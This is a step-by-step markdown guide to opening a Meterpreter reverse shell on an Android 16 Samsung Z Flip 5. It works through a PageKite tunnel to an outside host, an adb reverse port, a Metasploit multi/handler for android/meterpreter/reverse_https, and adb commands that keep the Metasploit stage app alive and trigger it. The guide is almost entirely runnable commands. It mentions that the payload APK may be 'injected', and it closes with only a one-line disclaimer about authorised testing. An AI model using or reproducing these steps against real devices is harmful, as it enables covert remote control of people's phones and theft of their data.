# Meterpreter Session on Android 16 - Samsung Z Flip 5

Complete guide to establishing a working Meterpreter reverse shell session on Android 16 running on a Samsung Z Flip 5 using Metasploit Framework.

## Prerequisites

- Metasploit Framework installed
- Android Debug Bridge (adb) installed
- PageKite account and configured
- Python3 installed
- Root/ADB access to the Samsung Z Flip 5

## Setup Instructions

### Step 1: Start PageKite Tunnel

Open a terminal and start the PageKite tunnel on port 4444:

```bash
python3 pagekite.py 4444 raw-tcp:kalicopwn.pagekite.me
```

**Note:** Replace `kalicopwn.pagekite.me` with your actual PageKite subdomain.

### Step 2: Configure ADB Reverse TCP (in separate terminal)

First, remove any existing reverse TCP configurations:

```bash
sudo kill -9 $(lsof -t -i:4444) 2>/dev/null
adb reverse --remove-all
```

Set up the reverse TCP tunnel from device to host:

```bash
adb reverse tcp:4444 tcp:4444
```

### Step 3: Set Up Metasploit Handler (in new shell)

Launch msfconsole and configure the multi/handler exploit:

```bash
msfconsole
```

Within msfconsole, run the following commands:

```
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_https
set LHOST 127.0.0.1
set LPORT 4444
set IgnorePayloadUUIDs true
exploit
```

**Expected output:** Handler will start listening for incoming connections.

### Step 4: Enable Device Idle Whitelist (in bash terminal)

Whitelist the Metasploit stage application to prevent system from killing the process:

```bash
adb shell dumpsys deviceidle whitelist +com.metasploit.stage
```

### Step 5: Trigger Meterpreter Session

Send a broadcast to spawn the Meterpreter session:

```bash
adb shell am broadcast -n com.metasploit.stage/.MainBroadcastReceiver
```

## Expected Result

After executing Step 5, you should receive an active Meterpreter session in your msfconsole handler with a shell prompt.

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Port 4444 already in use | Run: `sudo kill -9 $(lsof -t -i:4444)` |
| Device not responding | Reconnect ADB: `adb disconnect && adb connect` |
| No Meterpreter session | Ensure device idle whitelist is set and broadcast is sent |
| PageKite connection fails | Verify pagekite.me credentials and internet connection |

## Notes

- The `IgnorePayloadUUIDs true` setting is important for Android compatibility
- Ensure ADB reverse is properly configured before running the broadcast
- Device must have Metasploit stage APK pre-installed or injected
- This process requires ADB debugging enabled on the device

## References

- [Metasploit Framework Documentation](https://docs.metasploit.com/)
- [Android Debug Bridge (adb)](https://developer.android.com/tools/adb)
- [PageKite Documentation](https://pagekite.net/)

---

**Disclaimer:** This guide is for educational and authorized security testing purposes only.
